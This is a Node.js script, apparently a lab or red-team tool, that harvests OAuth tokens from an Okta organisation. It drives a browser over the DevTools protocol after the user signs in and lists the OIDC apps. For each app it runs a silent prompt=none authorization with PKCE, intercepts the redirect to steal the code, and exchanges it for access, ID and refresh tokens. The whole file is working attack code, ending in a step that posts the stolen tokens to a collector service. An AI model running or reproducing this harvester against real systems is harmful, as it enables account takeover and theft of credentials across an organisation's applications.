#!/usr/bin/env node
import crypto from "node:crypto";
import { spawn } from "node:child_process";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import {
  CdpClient,
  browserSessionProbe,
  delay,
  findBrowser,
  freePort,
  isOrgOrigin,
  stopBrowser,
  waitForTarget,
} from "./lab-browser-session-proof.mjs";

const orgUrl = "https://integrator-8282270.okta.com";
const COLLECTOR_URL = "http://127.0.0.1:8765";
const internalApps = new Set(["saasure", "okta_enduser", "okta_browser_plugin", "okta_oin_submission_tester_app", "okta_iga_reviewer", "okta_flow_sso", "flow"]);

async function evaluate(cdp, expression) {
  const result = await cdp.send("Runtime.evaluate", {
    expression,
    awaitPromise: true,
    returnByValue: true,
  });
  if (result.exceptionDetails) {
    throw new Error(
      result.exceptionDetails.exception?.description ||
        result.exceptionDetails.text
    );
  }
  return result.result?.value;
}

function generatePkce() {
  const verifier = crypto.randomBytes(32).toString("base64url");
  const challenge = crypto.createHash("sha256").update(verifier).digest("base64url");
  return { verifier, challenge };
}

async function main() {
  const browserPath = findBrowser();
  const debugPort = await freePort();
  const profileDir = fs.mkdtempSync(path.join(os.tmpdir(), "okta-harvest-test-"));

  console.log(`Launching browser on CDP port ${debugPort}...`);
  const browser = spawn(
    browserPath,
    [
      `--user-data-dir=${profileDir}`,
      `--remote-debugging-port=${debugPort}`,
      "--no-first-run",
      "--no-default-browser-check",
      "--new-window",
      `${orgUrl}/`,
    ],
    { detached: false, stdio: "ignore" }
  );

  let cdp;
  try {
    const target = await waitForTarget(debugPort, orgUrl);
    cdp = new CdpClient(target.webSocketDebuggerUrl);
    await cdp.ready;
    await cdp.send("Page.enable");
    await cdp.send("Network.enable");
    await cdp.send("Runtime.enable");

    console.log("Sign in to Okta...\n");
    let probe;
    while (true) {
      probe = await browserSessionProbe(cdp);
      if (probe?.ok && probe.status === 200 && isOrgOrigin(probe.origin, orgUrl)) break;
      await delay(2000);
    }
    console.log(`Authenticated as ${probe.user_login} (${probe.user_id})`);
    await delay(5000);

    const currentUrl = await evaluate(cdp, "location.href");
    console.log(`Browser on: ${currentUrl}\n`);

    // Step 1: Enumerate apps
    console.log("--- Step 1: Enumerate apps via /api/v1/apps ---");
    const allApps = await evaluate(cdp, `
      fetch("/api/v1/apps?limit=200", {
        credentials: "include",
        headers: { "Accept": "application/json" }
      }).then(r => r.json())
    `);

    if (!Array.isArray(allApps)) {
      console.log("ERROR: /api/v1/apps did not return an array");
      return;
    }
    console.log(`Total apps: ${allApps.length}`);

    const oidcApps = allApps
      .filter((app) => {
        if (app.status !== "ACTIVE" || app.signOnMode !== "OPENID_CONNECT") return false;
        if (internalApps.has(app.name)) return false;
        if (!app._links?.appLinks?.[0]?.href) return false;
        const authMethod = app.credentials?.oauthClient?.token_endpoint_auth_method;
        if (authMethod && authMethod !== "none") return false;
        return true;
      })
      .map((app) => ({
        appInstanceId: app.id,
        label: app.label,
        appName: app.name,
        linkUrl: app._links.appLinks[0].href,
        clientId: app.credentials?.oauthClient?.client_id || app.id,
        redirectUris: app.settings?.oauthClient?.redirect_uris || [],
      }));

    console.log(`OIDC apps to harvest: ${oidcApps.length}`);
    for (const a of oidcApps) {
      console.log(`  ${a.label} | clientId=${a.clientId} | redirects=${a.redirectUris.join(", ")}`);
    }

    if (oidcApps.length === 0) {
      console.log("No OIDC apps to harvest.");
      return;
    }

    // Step 2: For each app, use prompt=none OAuth + PKCE with CDP Fetch interception
    console.log("\n--- Step 2: Silent OAuth harvest (prompt=none + PKCE + Fetch intercept) ---");
    const harvest = [];

    for (const app of oidcApps) {
      const redirectUri = app.redirectUris[0];
      if (!redirectUri || !app.clientId) {
        console.log(`\n[${app.label}] no redirectUri or clientId, skipping`);
        continue;
      }

      console.log(`\n[${app.label}] clientId=${app.clientId} redirect=${redirectUri}`);

      const pkce = generatePkce();
      const oauthState = crypto.randomUUID();
      const nonce = crypto.randomUUID();

      const authorizeUrl =
        `${orgUrl}/oauth2/default/v1/authorize?` +
        `client_id=${encodeURIComponent(app.clientId)}&` +
        `redirect_uri=${encodeURIComponent(redirectUri)}&` +
        `response_type=code&` +
        `scope=${encodeURIComponent("openid profile email")}&` +
        `state=${oauthState}&` +
        `nonce=${nonce}&` +
        `code_challenge=${pkce.challenge}&` +
        `code_challenge_method=S256&` +
        `prompt=none`;

      let capturedUrl = null;
      const handler = (params) => {
        if (!capturedUrl) capturedUrl = params.request.url;
        cdp.send("Fetch.continueRequest", { requestId: params.requestId }).catch(() => {});
      };
      cdp.on("Fetch.requestPaused", handler);

      const redirectOrigin = new URL(redirectUri).origin;
      await cdp.send("Fetch.enable", {
        patterns: [{ urlPattern: `${redirectOrigin}/*` }],
      });

      try {
        console.log(`[${app.label}] navigating to authorize (prompt=none)...`);
        await cdp.send("Page.navigate", { url: authorizeUrl });
        await delay(5000);
      } finally {
        cdp.off("Fetch.requestPaused", handler);
        await cdp.send("Fetch.disable");
      }

      if (!capturedUrl) {
        let landedUrl = "(unknown)";
        try { landedUrl = await evaluate(cdp, "location.href"); } catch {}
        console.log(`[${app.label}] no redirect intercepted, browser on: ${landedUrl}`);
        console.log(`[${app.label}] skipping (not assigned or MFA required)`);
        await cdp.send("Page.navigate", { url: currentUrl });
        await delay(1000);
        continue;
      }

      console.log(`[${app.label}] intercepted redirect: ${capturedUrl}`);
      const captured = new URL(capturedUrl);

      const error = captured.searchParams.get("error");
      if (error) {
        console.log(`[${app.label}] OAuth error: ${error} - ${captured.searchParams.get("error_description") || ""}`);
        continue;
      }

      const code = captured.searchParams.get("code");
      if (!code) {
        console.log(`[${app.label}] no code in intercepted URL`);
        continue;
      }

      console.log(`[${app.label}] got authorization code, exchanging for tokens...`);

      try {
        const tokenResp = await fetch(`${orgUrl}/oauth2/default/v1/token`, {
          method: "POST",
          headers: { "Content-Type": "application/x-www-form-urlencoded" },
          body: new URLSearchParams({
            grant_type: "authorization_code",
            code,
            redirect_uri: redirectUri,
            client_id: app.clientId,
            code_verifier: pkce.verifier,
          }),
        });
        const tokenData = await tokenResp.json();

        if (tokenData.error) {
          console.log(`[${app.label}] token exchange error: ${tokenData.error} - ${tokenData.error_description || ""}`);
          continue;
        }

        const hasAccess = !!tokenData.access_token;
        const hasId = !!tokenData.id_token;
        const hasRefresh = !!tokenData.refresh_token;
        console.log(`[${app.label}] access=${hasAccess} id=${hasId} refresh=${hasRefresh}`);

        if (hasAccess || hasId) {
          harvest.push({
            app_id: app.appInstanceId,
            app_label: app.label,
            app_name: app.appName,
            app_link_url: app.linkUrl,
            app_origin: new URL(redirectUri).origin,
            tokens: {
              accessToken: tokenData.access_token ? {
                accessToken: tokenData.access_token,
                expiresAt: Math.floor(Date.now() / 1000) + (tokenData.expires_in || 3600),
                scopes: tokenData.scope?.split(" ") || [],
                tokenType: tokenData.token_type,
              } : undefined,
              idToken: tokenData.id_token ? {
                idToken: tokenData.id_token,
              } : undefined,
              refreshToken: tokenData.refresh_token ? {
                refreshToken: tokenData.refresh_token,
              } : undefined,
            },
          });
          console.log(`[${app.label}] HARVESTED`);
        }
      } catch (err) {
        console.log(`[${app.label}] token exchange failed: ${err.message}`);
      }
    }

    // Step 3: Post to collector
    console.log(`\n--- Step 3: Results ---`);
    console.log(`Apps scanned: ${oidcApps.length}`);
    console.log(`Apps with tokens: ${harvest.length}`);

    if (harvest.length > 0) {
      const payload = {
        org_host: new URL(orgUrl).hostname,
        captured_at: new Date().toISOString(),
        subject: probe.user_login,
        user_id: probe.user_id,
        apps_scanned: oidcApps.length,
        apps: harvest,
      };

      console.log(`\nPosting to collector...`);
      try {
        const resp = await fetch(`${COLLECTOR_URL}/v1/tokens`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload),
        });
        const result = await resp.json();
        if (resp.ok) {
          console.log(`Saved: ${result.file_name}`);
        } else {
          console.log(`Collector error: ${JSON.stringify(result)}`);
        }
      } catch (err) {
        console.log(`Collector not reachable: ${err.message}`);
        console.log(`Raw payload logged below instead.`);
      }

      for (const app of harvest) {
        console.log(`\n${app.app_label} (${app.app_origin}):`);
        if (app.tokens.accessToken?.accessToken) {
          const jwt = app.tokens.accessToken.accessToken;
          console.log(`  Access Token: ${jwt.slice(0, 50)}...`);
          try {
            const claims = JSON.parse(Buffer.from(jwt.split(".")[1], "base64url").toString());
            console.log(`    sub: ${claims.sub}, scp: ${(claims.scp || []).join(", ")}, exp: ${new Date(claims.exp * 1000).toISOString()}`);
          } catch {}
        }
        if (app.tokens.refreshToken?.refreshToken) {
          console.log(`  Refresh Token: ${app.tokens.refreshToken.refreshToken.slice(0, 30)}...`);
        }
      }
    } else {
      console.log("No tokens harvested.");
    }
  } finally {
    cdp?.close();
    stopBrowser(browser);
    await delay(500);
    try { fs.rmSync(profileDir, { recursive: true, force: true }); } catch {}
  }
}

main().catch(e => { console.error(e.message); process.exitCode = 1; });
